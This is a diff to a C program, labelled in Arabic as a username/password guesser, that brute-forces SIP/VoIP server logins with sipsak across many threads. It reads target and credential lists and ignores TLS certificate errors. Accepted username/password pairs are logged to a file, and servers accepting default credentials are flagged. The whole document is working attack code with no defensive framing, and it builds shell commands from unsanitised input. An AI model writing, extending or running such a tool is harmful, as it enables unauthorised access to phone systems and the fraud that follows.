@@ -1,65 +1,99 @@
+تخمن يوزر وباسورد واحد
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <pthread.h>
 
 #define MAX_LINE 512
-#define MAX_THREADS 500  // Number of targets to be processed simultaneously
-#define COMMAND_SIZE 2048  // Increase the size of the command buffer
+#define COMMAND_SIZE 2048
 
 typedef struct {
     char target[MAX_LINE];
+    char protocol[5];
 } ThreadData;
 
-char **load_credentials(int *count) {
-    FILE *credentials = fopen("credentials.txt", "r");
-    char **cred_array = NULL;
-    char line[MAX_LINE];
-    *count = 0;
+// Global variable to store targets that accepted default credentials
+char accepted_default_targets[MAX_LINE][MAX_LINE];
+int accepted_default_count = 0;
 
-    while (fgets(line, sizeof(line), credentials)) {
-        strtok(line, "\n");  // Remove newline
-        cred_array = realloc(cred_array, (*count + 1) * sizeof(char *));
-        cred_array[*count] = strdup(line);
-        (*count)++;
+int is_target_accepted_default(const char *target) {
+    for (int i = 0; i < accepted_default_count; i++) {
+        if (strcmp(target, accepted_default_targets[i]) == 0) {
+            return 1;
+        }
     }
-
-    fclose(credentials);
-    return cred_array;
-}
-
-void free_credentials(char **cred_array, int count) {
-    for (int i = 0; i < count; i++) {
-        free(cred_array[i]);
-    }
-    free(cred_array);
+    return 0;
 }
 
 void *try_login(void *arg) {
     ThreadData *data = (ThreadData *)arg;
+    if (is_target_accepted_default(data->target)) {
+        free(data);
+        return NULL;
+    }
     char command[COMMAND_SIZE];
+    FILE *credentials = fopen("credentials.txt", "r");
+    char credential_line[MAX_LINE];
+    char output[COMMAND_SIZE];
 
-    int cred_count = 0;
-    char **credentials = load_credentials(&cred_count);
-
-    for (int i = 0; i < cred_count; i++) {
-        char *username = strtok(credentials[i], ":");
-        char *password = strtok(NULL, ":");
-
-        snprintf(command, sizeof(command), "sipsak -U -C sip:%s@home.com --from sip:%s@%s -u %s -a %s -p %s -s sip:%s@%s -i -vvv -E tls --tls-ignore-cert-failure",
-                 username, username, data->target, username, password, data->target, username, data->target);
-
-        printf("Executing command: %s\n", command);  // Print the command before executing
-        system(command);
+    if (!credentials) {
+        perror("Failed to open credentials file");
+        free(data);
+        return NULL;
     }
 
-    free_credentials(credentials, cred_count);
+    int is_default_accepted = 0;
+
+    while (fgets(credential_line, sizeof(credential_line), credentials)) {
+        strtok(credential_line, "\n");  // Remove newline
+
+        char *username = strtok(credential_line, ":");
+        char *password = strtok(NULL, ":");
+
+        if (strcmp(data->protocol, "tls") == 0) {
+            snprintf(command, sizeof(command), "sipsak -U -C sip:%s@home.com --from sip:%s@%s -u %s -a %s -p %s -s sip:%s@%s -i -vvv -E %s --tls-ignore-cert-failure",
+                     username, username, data->target, username, password, data->target, username, data->target, data->protocol);
+        } else {
+            snprintf(command, sizeof(command), "sipsak -U -C sip:%s@home.com --from sip:%s@%s -u %s -a %s -p %s -s sip:%s@%s -i -vvv -E %s",
+                     username, username, data->target, username, password, data->target, username, data->target, data->protocol);
+        }
+
+        FILE *cmd_output = popen(command, "r");
+        while (fgets(output, sizeof(output), cmd_output)) {
+            if (strstr(output, "200 OK") || strstr(output, "202 Accepted")) {
+                if (strcmp(username, "anyuser") == 0 && strcmp(password, "anypassword") == 0) {
+                    is_default_accepted = 1;
+                    strcpy(accepted_default_targets[accepted_default_count++], data->target);
+                    break;
+                }
+                FILE *success_log = fopen("successful_logins.txt", "a");
+                fprintf(success_log, "Target: %s, Username: %s, Password: %s\n", data->target, username, password);
+                fclose(success_log);
+            }
+        }
+        pclose(cmd_output);
+        if (is_default_accepted) {
+            break;
+        }
+    }
+
+    fclose(credentials);
     free(data);
     return NULL;
 }
 
-int main() {
-    FILE *targets = fopen("targets.txt", "r");
+int main(int argc, char *argv[]) {
+    if (argc != 4) {
+        printf("Usage: %s <protocol> <threads> <targets_file>\n", argv[0]);
+        return 1;
+    }
+
+    char *protocol = argv[1];
+    int max_threads = atoi(argv[2]);
+    char *targets_file = argv[3];
+
+    FILE *targets = fopen(targets_file, "r");
     char target_line[MAX_LINE];
 
     if (!targets) {
@@ -67,7 +101,7 @@ int main() {
         return 1;
     }
 
-    pthread_t threads[MAX_THREADS];
+    pthread_t threads[max_threads];
     int current_thread = 0;
 
     while (fgets(target_line, sizeof(target_line), targets)) {
@@ -75,12 +109,13 @@ int main() {
 
         ThreadData *data = malloc(sizeof(ThreadData));
         strncpy(data->target, target_line, sizeof(data->target) - 1);
+        strncpy(data->protocol, protocol, sizeof(data->protocol) - 1);
 
         pthread_create(&threads[current_thread], NULL, try_login, data);
         current_thread++;
 
-        if (current_thread >= MAX_THREADS) {
-            for (int i = 0; i < MAX_THREADS; i++) {
+        if (current_thread >= max_threads) {
+            for (int i = 0; i < max_threads; i++) {
                 pthread_join(threads[i], NULL);
             }
             current_thread = 0;
